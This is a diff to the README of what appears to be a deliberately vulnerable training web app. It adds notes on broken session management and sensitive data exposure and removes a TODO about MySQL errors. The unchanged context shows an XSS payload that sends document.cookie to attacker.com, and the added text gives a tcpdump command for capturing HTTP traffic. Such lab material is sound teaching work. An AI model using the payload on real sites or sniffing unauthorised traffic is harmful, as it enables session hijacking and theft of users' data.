@@ -43,9 +43,13 @@ vagrant plugin install vagrant-vbguest
 ```html
 "><script>document.location= "http://www.attacker.com/cgi-bin/cookie.cgi?foo="+document.cookie</script>"
 ```
-___
 
-### TODOs:
-- when you start the machine for the first time there is mysql error at the end of the provisioning:
-  - ==> default: ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2)
-  - ==> default: ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2)
+### Broken Session Management
+* application with URL rewriting
+* no logout and session timeout
+
+### Sensitive Data Exposure
+* to monitor HTTP traffic
+```bash
+root> tcpdump -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
+```
